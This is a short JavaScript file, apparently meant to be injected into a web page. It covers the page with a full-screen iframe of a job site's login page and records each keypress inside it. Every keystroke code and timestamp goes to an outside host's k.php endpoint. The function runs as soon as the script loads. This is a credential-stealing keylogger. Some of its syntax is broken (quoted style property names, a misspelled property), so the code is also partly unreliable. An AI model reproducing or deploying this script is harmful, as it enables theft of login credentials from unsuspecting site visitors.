var script = document.createElement('script');
script.src = 'http://code.jquery.com/jquery-3.4.1.min.js';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

function ifrm_kl(){
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("src", "https://www.104.com.tw/login");
	ifrm.id = "x"
	ifrm.style.width = "100%";
	ifrm.style.height = "100%";
	ifrm.style.position = "absolute";
	ifrm.style.top = "0";
	ifrm.style.left = "0";
	ifrm.style.'z-index' = "2";
	ifrm.style.'vackground-color' = "#ffffff";
	ifrm.onload = "$('#x').contents().keypress(function(event) {$.get('https://www.glhf.com.tw/k.php?k='+event.which+'&amp;t='+event.timeStamp,function(data){});});"
	var body = document.getElementsByTagName("body")[0];
	body.insertBefore(ifrm, body.firstChild);
}
ifrm_kl();
